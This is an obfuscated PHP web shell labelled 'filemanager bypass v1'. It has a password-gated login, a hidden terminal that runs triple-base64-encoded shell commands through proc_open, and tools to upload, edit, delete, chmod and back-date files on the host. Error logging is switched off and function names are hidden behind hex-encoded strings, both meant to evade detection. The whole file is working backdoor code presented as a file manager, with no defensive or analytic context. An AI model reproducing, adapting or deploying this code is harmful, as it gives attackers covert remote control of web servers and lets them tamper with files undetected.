<?php
/*
filemanager bypass v1
author: z_one
*/
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$h2b = chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110); $a = $h2b("6d6435"); $b = $h2b("686561646572"); $c = $h2b("696e695f736574"); $d = $h2b("626173656e616d65"); $e = $h2b("676574637764"); $f = $h2b("6469736b5f667265655f7370616365"); $g = $h2b("6469736b5f746f74616c5f7370616365"); $h = $h2b("70687076657273696f6e"); $i = $h2b("696e695f676574"); $j = $h2b("7368656c6c5f65786563"); $k = $h2b("65786563"); $l = $h2b("73797374656d"); $m = $h2b("7061737374687275"); $n = $h2b("7374725f7265706c616365"); $o = $h2b("66696c655f657869737473"); $p = $h2b("69735f646972"); $q = $h2b("6d6b646972"); $r = $h2b("726d646972"); $s = $h2b("756e6c696e6b"); $t = $h2b("636f7079"); $u = $h2b("72656e616d65"); $v = $h2b("63686d6f64"); $w = $h2b("6f6374646563"); $x = $h2b("7363616e646972"); $y = $h2b("66696c6573697a65"); $z = $h2b("66696c656d74696d65"); $aa = $h2b("737472746f74696d65"); $ab = $h2b("64617465"); $ac = $h2b("746f756368"); $ad = $h2b("66696c655f7075745f636f6e74656e7473"); $ae = $h2b("66696c655f6765745f636f6e74656e7473"); $af = $h2b("66696c657065726d73"); $b64d = $h2b("6261736536345f6465636f6465");
$APP_NAME = "File Manager";
$x5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
if(isset($_POST['login'])){
    $pass = $_POST['password'];
    if($a($pass) === $x5){
        $_SESSION['logged_in'] = true;
        $b("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $msg = "Password salah!";
    }
}
if(isset($_GET['logout'])){
    session_destroy();
    $b("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$APP_NAME?> - Login</title>
        <style>
            body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
            input{padding:6px;margin:5px;border-radius:4px;border:none;}
            input[type=password]{width:200px;}
            input[type=submit]{background:#7d3c98;color:#fff;cursor:pointer;}
            .msg{color:#e74c3c;margin-top:10px;}
        </style>
    </head>
    <body>
        <h1><?=$APP_NAME?></h1>
        <form method="POST">
            Password: <input type="password" name="password"><br>
            <input type="submit" name="login" value="Login">
        </form>
        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
    </body>
    </html>
    <?php
    exit;
}
function perms($file){ global $af; $perm = $af($file); return substr(sprintf('%o', $perm), -4); }
function owner($file){ if(function_exists('posix_getpwuid')){ $uid = fileowner($file); $info = posix_getpwuid($uid); return $info['name']; } return 'unknown'; }
function filedate($file){ global $z,$ab; return $ab("Y-m-d H:i:s", $z($file)); }

function deleteDirectory($dir) {
    global $o, $p, $s, $x, $r;
    if(!$o($dir)) return true;
    if(!$p($dir)) return $s($dir);
    foreach($x($dir) as $item) {
        if($item == '.' || $item == '..') continue;
        if(!deleteDirectory($dir . '/' . $item)) return false;
    }
    return $r($dir);
}

function ekse($coman, $serlok) {
    global $b64d;
    if (!function_exists("proc_open")) {
        echo "proc_open function disabled !";
        return;
    }
    $komen = $b64d($b64d($b64d($coman)));
    $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r"));
    $process = @proc_open($komen, $descriptorspec, $pipes, $serlok);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo "<textarea rows='25' readonly='' style='width:100%; background:#1a1a1a00; color:#00ffbf; border:1px solid #1a1a1a00; border-radius:6px; padding:12px; font-family:monospace;'>" . htmlspecialchars($output . $error) . "</textarea>";
    } else {
        echo "Failed to execute command";
    }
}
$BASE_PATH = $e();
$path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
$path = $n("\\","/",$path);
$paths = explode("/", $path);
$search = isset($_GET['search']) ? strtolower($_GET['search']) : "";
$msg = "";
$msg_type = "";
if (isset($_GET['cmd']) && $_GET['cmd'] == "bhl") {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?=$APP_NAME?> - Terminal</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <style>
            *{box-sizing:border-box;}
            body{background:#000;font-family:monospace;color:#eee;margin:0;padding:10px;min-height:100vh;background-image:url('https://hw-media-cdn-mingchao.kurogame.com/static/assets/rw1-7a848ef9.png');background-position:right center;background-size:50% auto;background-repeat:no-repeat;background-attachment:fixed;}
            .terminal-container{max-width:900px;margin:50px auto;border:1px solid #7d3c98;border-radius:10px;padding:20px;}
            h1{color:#c77dff;text-align:center;}
            input,textarea{background:#000;color:#00ffd5;border:1px solid #555;border-radius:6px;padding:10px;width:100%;}
            button{background:#7d3c98;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;}
            button:hover{background:#9b59b6;}
            .back-btn{display:inline-block;margin-bottom:20px;background:#3498db;color:#fff;padding:8px 15px;border-radius:6px;text-decoration:none;}
            .back-btn:hover{background:#2980b9;}
        </style>
    </head>
    <body>
        <div class="terminal-container">
            <a href="?path=<?=urlencode($path)?>" class="back-btn"><i class="fa fa-arrow-left"></i> Back to File Manager</a>
            <h1><i class="fa fa-terminal"></i> Terminal</h1>
            <form method="post" onsubmit="document.getElementById('comandnya').value = btoa(btoa(btoa(document.getElementById('comandnya').value)))">
                <input type="text" name="komen" id="comandnya" style="color: #fff; background: #1a1a1a00;" placeholder="uname -a"><br><br>
                <button type="submit" name="comandeks"> >> Run Command</button>
            </form>
            <br>
            <?php if (isset($_POST['comandeks'])) { ekse($_POST['komen'], $path); } ?>
        </div>
    </body>
    </html>
    <?php
    exit();
}
if(isset($_FILES['file']) && $_FILES['file']['error'] == 0){
    $dest = $path.'/'.$_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
        $msg = "Upload berhasil: " . htmlspecialchars($_FILES['file']['name']);
        $msg_type = "success";
    } else {
        $msg = "Upload gagal: " . htmlspecialchars($_FILES['file']['name']);
        $msg_type = "error";
    }
}

if(isset($_POST['newfile']) && !empty($_POST['newfile'])){
    $newfile = $_POST['newfile'];
    $fullpath = $path.'/'.$newfile;
    if(!$o($fullpath)){
        $ad($fullpath, "");
        $msg = "File berhasil dibuat: " . htmlspecialchars($newfile);
        $msg_type = "success";
    } else {
        $msg = "File sudah ada: " . htmlspecialchars($newfile);
        $msg_type = "error";
    }
}

if(isset($_POST['newfolder']) && !empty($_POST['newfolder'])){
    $newfolder = $_POST['newfolder'];
    $fullpath = $path.'/'.$newfolder;
    if(!$p($fullpath)){
        $q($fullpath, 0755);
        $msg = "Folder berhasil dibuat: " . htmlspecialchars($newfolder);
        $msg_type = "success";
    } else {
        $msg = "Folder sudah ada: " . htmlspecialchars($newfolder);
        $msg_type = "error";
    }
}

if(isset($_POST['delete']) && isset($_POST['target'])){
    $target = $_POST['target'];
    $name = $d($target);
    if(deleteDirectory($target)){
        $msg = "Berhasil dihapus: " . htmlspecialchars($name);
        $msg_type = "success";
    } else {
        $msg = "Gagal menghapus: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}

if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
    $oldname = $_POST['oldname'];
    $newname = dirname($oldname) . '/' . $_POST['newname'];
    $oldbasename = $d($oldname);
    $newbasename = $_POST['newname'];
    if($u($oldname, $newname)){
        $msg = "Rename berhasil: " . htmlspecialchars($oldbasename) . " → " . htmlspecialchars($newbasename);
        $msg_type = "success";
    } else {
        $msg = "Rename gagal: " . htmlspecialchars($oldbasename);
        $msg_type = "error";
    }
}

if(isset($_POST['chmod']) && isset($_POST['target']) && isset($_POST['perm'])){
    $target = $_POST['target'];
    $perm = $_POST['perm'];
    $name = $d($target);
    if($v($target, $w($perm))){
        $msg = "Chmod berhasil: " . htmlspecialchars($name) . " → " . htmlspecialchars($perm);
        $msg_type = "success";
    } else {
        $msg = "Chmod gagal: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}

if(isset($_POST['savefile']) && isset($_POST['target']) && isset($_POST['src'])){
    $target = $_POST['target'];
    $name = $d($target);
    if($ad($target, $_POST['src'])){
        $msg = "File berhasil disimpan: " . htmlspecialchars($name);
        $msg_type = "success";
    } else {
        $msg = "Gagal menyimpan: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}

if(isset($_POST['chdate']) && isset($_POST['target']) && isset($_POST['new_date'])){
    $target = $_POST['target'];
    $name = $d($target);
    $timestamp = $aa($_POST['new_date']);
    if($timestamp && $ac($target, $timestamp)){
        $msg = "Berhasil ubah tanggal: " . htmlspecialchars($name);
        $msg_type = "success";
    } else {
        $msg = "Gagal ubah tanggal: " . htmlspecialchars($name);
        $msg_type = "error";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title><?=$APP_NAME?></title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
*{box-sizing:border-box;}
html{background:#000;}
body{font-family:monospace;color:#eee;margin:0;padding:10px;min-height:100vh;background-color:#000;background-image:url('https://hw-media-cdn-mingchao.kurogame.com/static/assets/rw1-7a848ef9.png');background-position:right center;background-size:50% auto;background-repeat:no-repeat;background-attachment:fixed;}
::-webkit-scrollbar{width:8px;height:8px;}
::-webkit-scrollbar-track{background:#000;}
::-webkit-scrollbar-thumb{background:#7d3c98;border-radius:10px;}
h1{color:#c77dff;text-align:center;padding:15px 0;margin:0 0 10px;font-size:30px;cursor:pointer;text-shadow:0 0 8px rgba(199,125,255,.4);transition:.3s;}
h1:hover{opacity:.85;}
a{color:#00ffd5;text-decoration:none;}
a:hover{color:#f1c40f;}
.breadcrumb{margin:10px;padding:10px;background:transparent;border:1px solid #7d3c98;border-radius:8px;}
.breadcrumb a{margin-right:5px;}
.table-container{width:calc(100% - 20px);margin:0 10px;overflow-x:auto;background:transparent;border:1px solid #7d3c98;border-radius:10px;}
table{width:100%;border-collapse:collapse;table-layout:auto;font-size:12px;background:transparent;}
th{background:#7d3c98;color:#fff;padding:10px;text-align:left;white-space:nowrap;font-weight:700;border-bottom:1px solid rgba(255,255,255,.08);}
td{padding:9px 10px;white-space:nowrap;border-bottom:1px solid rgba(255,255,255,.05);color:#f5f5f5;text-shadow:0 0 3px #000;}
tr:nth-child(even){background:rgba(255,255,255,.01);}
tr:hover{background:rgba(255,255,255,.04);}
td:first-child,th:first-child{width:40%;max-width:400px;}
td:first-child{overflow:hidden;text-overflow:ellipsis;}
td:nth-child(2),td:nth-child(3),th:nth-child(2),th:nth-child(3){width:70px;text-align:center;}
td:nth-child(4),th:nth-child(4){width:180px;text-align:center;}
td:nth-child(5),th:nth-child(5){width:170px;text-align:center;}
td:nth-child(6),th:nth-child(6){width:140px;text-align:center;}
input,select,textarea{background:#000;color:#00ffd5;border:1px solid #555;border-radius:6px;padding:6px;}
input:focus,textarea:focus{outline:none;border-color:#c77dff;box-shadow:0 0 10px rgba(199,125,255,.3);}
textarea{width:95%;height:250px;}
button,input[type=submit]{background:#7d3c98;color:#fff;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;transition:.2s;}
button:hover,input[type=submit]:hover{background:#9b59b6;}
.action-btn{background:transparent;border:none;cursor:pointer;padding:4px 6px;border-radius:5px;transition:.2s;font-size:12px;position:relative;}
.action-btn:hover{background:rgba(255,255,255,.08);transform:scale(1.08);}
.action-btn .tooltip{visibility:hidden;background:#000;color:#fff;text-align:center;padding:4px 7px;border-radius:4px;position:absolute;bottom:125%;left:50%;transform:translateX(-50%);white-space:nowrap;font-size:10px;border:1px solid #555;z-index:99999;opacity:0;transition:opacity .2s;pointer-events:none;}
.action-btn:hover .tooltip{visibility:visible;opacity:1;}
.msg-box{margin-top:8px;padding:10px 12px;border-radius:6px;font-size:13px;}
.msg-box.success{background:rgba(46,204,113,.12);border:1px solid #2ecc71;color:#2ecc71;}
.msg-box.error{background:rgba(231,76,60,.12);border:1px solid #e74c3c;color:#ff8a8a;}
.logout-btn{background:#7d3c98;color:#fff;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;margin-left:5px;text-decoration:none;display:inline-block;font-size:12px;transition:.2s;}
.logout-btn:hover{background:#9b59b6;}
.modal{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;border:1px solid #7d3c98;border-radius:12px;padding:18px;z-index:99999;}
.modal-small{width:420px;max-width:95%;}
.modal-editor{width:85%;max-width:1200px;height:85vh;overflow:hidden;}
.modal h3{color:#f1c40f;margin:0 0 12px;font-size:22px;}
.modal .close{color:#ff3b3b;cursor:pointer;float:right;font-size:24px;font-weight:700;}
.modal .close:hover{color:#fff;}
.modal input{width:100%;margin:8px 0;padding:10px;}
.modal-editor textarea{width:100%;height:calc(85vh - 150px);background:#000;color:#00ffbf;border:1px solid #444;border-radius:6px;padding:12px;resize:none;font-family:monospace;font-size:15px;line-height:1.5;overflow:auto;}
.file-link{cursor:pointer;color:#00ffd5;}
.file-link:hover{color:#f1c40f;}
.fa-folder,.fa-file{margin-right:5px;}
@media(max-width:768px){body{background-size:90% auto;background-position:center top;}.modal-editor{width:95%;height:90vh;}.modal-editor textarea{height:calc(90vh - 150px);font-size:13px;}table{font-size:11px;}}
</style>
<script>
function openModal(id){ document.getElementById(id).style.display='block'; document.body.classList.add('modal-open');}
function closeModal(id){ document.getElementById(id).style.display='none'; document.body.classList.remove('modal-open');}
function goHome(){ window.location.href = window.location.pathname; }
</script>
</head>
<body>
<h1 onclick="goHome()"><?=$APP_NAME?></h1>

<div style="margin:10px;padding:10px;border:1px solid #7d3c98;border-radius:6px;">
    <b>Server Info</b><br>
    PHP: <?=$h();?><br>
    Disable: <?=$i('disable_functions')?><br>
    Path: <?=$path?><br>
    Disk: <?=round($f($path)/1024/1024,2)?> MB / <?=round($g($path)/1024/1024,2)?> MB
    <div style="margin-top:10px; display:flex; gap:8px; align-items:center;">
        <a href="?path=<?=htmlspecialchars($path)?>&cmd=bhl" class="logout-btn" style="background:#7d3c98;"><i class="fa fa-terminal"></i> Terminal</a>
        <a href="?logout=1" class="logout-btn"><i class="fa fa-sign-out"></i> Logout</a>
    </div>
</div>

<div class="breadcrumb">
<?php 
$bread_path = "";
foreach($paths as $id => $pat){ 
    if($pat == '' && $id == 0){
        echo '<a href="?path=/">/</a>';
        $bread_path = "/";
        continue;
    } 
    if($pat == '') continue;
    $bread_path .= $pat;
    echo '<a href="?path='.htmlspecialchars($bread_path).'">'.$pat.'</a>/';
    $bread_path .= "/";
} 
?>
</div>

<div style="margin:10px;padding:5px;border:1px solid #7d3c98;border-radius:6px;">
    <form enctype="multipart/form-data" method="POST" style="display:inline-block;">Upload: <input type="file" name="file"><input type="submit" value="Go"></form>
    <form method="POST" style="display:inline-block;margin-left:10px;">New File: <input type="text" name="newfile" size="8"><input type="submit" value="Create"></form>
    <form method="POST" style="display:inline-block;margin-left:10px;">New Folder: <input type="text" name="newfolder" size="8"><input type="submit" value="Create"></form>
    <?php if($msg): ?>
    <div class="msg-box <?=$msg_type?>"><i class="fa <?=$msg_type=='success'?'fa-check-circle':'fa-exclamation-circle'?>"></i> <?=$msg?></div>
    <?php endif; ?>
</div>

<div style="margin:10px;">
    <form method="GET">
        <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
        Search: <input type="text" name="search" value="<?=htmlspecialchars($search)?>">
        <input type="submit" value="Find">
    </form>
</div>

<div class="table-container">
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Perm</th>
<th>Owner</th>
<th>Last Modified</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php
$items = @$x($path);

if($items && is_array($items)) {
    $folders = array();
    $files = array();
    
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        if($search && stripos($item, $search) === false) continue;
        
        if($p($path . '/' . $item)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    sort($folders);
    sort($files);
    
    foreach($folders as $folder) {
        $fullpath = $path . '/' . $folder;
        $perm = perms($fullpath);
        $date = filedate($fullpath);
        $owner_name = owner($fullpath);
        
        $renameId = 'renameFolder_' . md5($fullpath);
        $chmodId = 'chmodFolder_' . md5($fullpath);
        $chdateId = 'chdateFolder_' . md5($fullpath);
        
        if(is_writable($fullpath)) {
            $perm_color = '#2ecc71';
        } elseif(!is_readable($fullpath)) {
            $perm_color = '#e74c3c';
        } else {
            $perm_color = '#ffffff';
        }
        
        echo '<tr>';
        echo '<td><i class="fa fa-folder" style="color: #ffe9a2"></i> <a href="?path=' . htmlspecialchars($fullpath) . '">' . htmlspecialchars($folder) . '</a></td>';
        echo '<td style="text-align:center">--</td>';
        echo '<td style="text-align:center"><span style="color:' . $perm_color . '">' . $perm . '</span></td>';
        echo '<td style="text-align:center">' . $owner_name . '</td>';
        echo '<td style="text-align:center">' . $date . '</td>';
        echo '<td style="text-align:center">
            <button onclick="openModal(\'' . $renameId . '\')" class="action-btn" style="color:#3498db;"><i class="fa fa-pencil-square-o"></i><span class="tooltip">Rename</span></button>
            <button onclick="openModal(\'' . $chdateId . '\')" class="action-btn" style="color:#9b59b6;"><i class="fa fa-calendar"></i><span class="tooltip">Chdate</span></button>
            <button onclick="openModal(\'' . $chmodId . '\')" class="action-btn" style="color:#f39c12;"><i class="fa fa-lock"></i><span class="tooltip">Chmod</span></button>
            <form method="POST" style="display:inline;" onsubmit="return confirm(\'Hapus folder ' . addslashes($folder) . '?\')">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <button type="submit" name="delete" class="action-btn" style="color:#e74c3c;"><i class="fa fa-trash-o"></i><span class="tooltip">Delete</span></button>
            </form>
          </td>
        </td>';
        
        echo '<div id="' . $renameId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $renameId . '\')">&times;</span>
            <h3>Rename: ' . htmlspecialchars($folder) . '</h3>
            <form method="POST">
                <input type="hidden" name="oldname" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="newname" value="' . htmlspecialchars($folder) . '">
                <button type="submit" name="rename">Rename</button>
            </form>
        </div>';
        
        echo '<div id="' . $chdateId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $chdateId . '\')">&times;</span>
            <h3>Change Date: ' . htmlspecialchars($folder) . '</h3>
            <form method="POST">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="new_date" value="' . $date . '">
                <button type="submit" name="chdate">Apply</button>
            </form>
        </div>';
        
        echo '<div id="' . $chmodId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $chmodId . '\')">&times;</span>
            <h3>Chmod: ' . htmlspecialchars($folder) . '</h3>
            <form method="POST">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="perm" value="' . $perm . '">
                <button type="submit" name="chmod">Apply</button>
            </form>
        </div>';
    }
    
    foreach($files as $file) {
        $fullpath = $path . '/' . $file;
        $size = $y($fullpath);
        if($size >= 1048576){
            $size_display = round($size/1048576,2).' MB';
        } elseif($size >= 1024){
            $size_display = round($size/1024,2).' KB';
        } else {
            $size_display = $size.' B';
        }
        
        $perm = perms($fullpath);
        $date = filedate($fullpath);
        $owner_name = owner($fullpath);
        
        $editId = 'editFile_' . md5($fullpath);
        $renameId = 'renameFile_' . md5($fullpath);
        $chmodId = 'chmodFile_' . md5($fullpath);
        $chdateId = 'chdateFile_' . md5($fullpath);
        
        if(is_writable($fullpath)) {
            $perm_color = '#2ecc71';
        } elseif(!is_readable($fullpath)) {
            $perm_color = '#e74c3c';
        } else {
            $perm_color = '#ffffff';
        }
        
        $content = is_readable($fullpath) ? htmlspecialchars($ae($fullpath)) : '';
        echo '<tr>';
        echo '<td><i class="fa fa-file" style="color: #d6d4ce"></i> <span class="file-link" onclick="openModal(\'' . $editId . '\')">' . htmlspecialchars($file) . '</span></td>';
        echo '<td style="text-align:center">' . $size_display . '</td>';
        echo '<td style="text-align:center"><span style="color:' . $perm_color . '">' . $perm . '</span></td>';
        echo '<td style="text-align:center">' . $owner_name . '</td>';
        echo '<td style="text-align:center">' . $date . '</td>';
        echo '<td style="text-align:center">
            <button onclick="openModal(\'' . $editId . '\')" class="action-btn" style="color:#2ecc71;"><i class="fa fa-edit"></i><span class="tooltip">Edit</span></button>
            <button onclick="openModal(\'' . $renameId . '\')" class="action-btn" style="color:#3498db;"><i class="fa fa-pencil-square-o"></i><span class="tooltip">Rename</span></button>
            <button onclick="openModal(\'' . $chdateId . '\')" class="action-btn" style="color:#9b59b6;"><i class="fa fa-calendar"></i><span class="tooltip">Chdate</span></button>
            <button onclick="openModal(\'' . $chmodId . '\')" class="action-btn" style="color:#f39c12;"><i class="fa fa-lock"></i><span class="tooltip">Chmod</span></button>
            <form method="POST" style="display:inline;" onsubmit="return confirm(\'Hapus file ' . addslashes($file) . '?\')">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <button type="submit" name="delete" class="action-btn" style="color:#e74c3c;"><i class="fa fa-trash-o"></i><span class="tooltip">Delete</span></button>
            </form>
          </td>
        </td>';
        
        echo '<div class="modal modal-editor" id="' . $editId . '">
            <span class="close" onclick="closeModal(\'' . $editId . '\')">&times;</span>
            <h3>Edit File: ' . htmlspecialchars($file) . '</h3>
            <form method="POST">
                <textarea name="src">' . $content . '</textarea><br>
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <button type="submit" name="savefile">Save</button>
            </form>
        </div>';
        
        echo '<div id="' . $renameId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $renameId . '\')">&times;</span>
            <h3>Rename: ' . htmlspecialchars($file) . '</h3>
            <form method="POST">
                <input type="hidden" name="oldname" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="newname" value="' . htmlspecialchars($file) . '">
                <button type="submit" name="rename">Rename</button>
            </form>
        </div>';
        
        echo '<div id="' . $chdateId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $chdateId . '\')">&times;</span>
            <h3>Change Date: ' . htmlspecialchars($file) . '</h3>
            <form method="POST">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="new_date" value="' . $date . '">
                <button type="submit" name="chdate">Apply</button>
            </form>
        </div>';
        
        echo '<div id="' . $chmodId . '" class="modal modal-small">
            <span class="close" onclick="closeModal(\'' . $chmodId . '\')">&times;</span>
            <h3>Chmod: ' . htmlspecialchars($file) . '</h3>
            <form method="POST">
                <input type="hidden" name="target" value="' . htmlspecialchars($fullpath) . '">
                <input type="text" name="perm" value="' . $perm . '">
                <button type="submit" name="chmod">Apply</button>
            </form>
        </div>';
    }
} else {
    echo '<tr><td colspan="6" style="color:#e74c3c;text-align:center">Cannot read directory</td></tr>';
}
?>
</tbody>
</div>
</body>
</html>
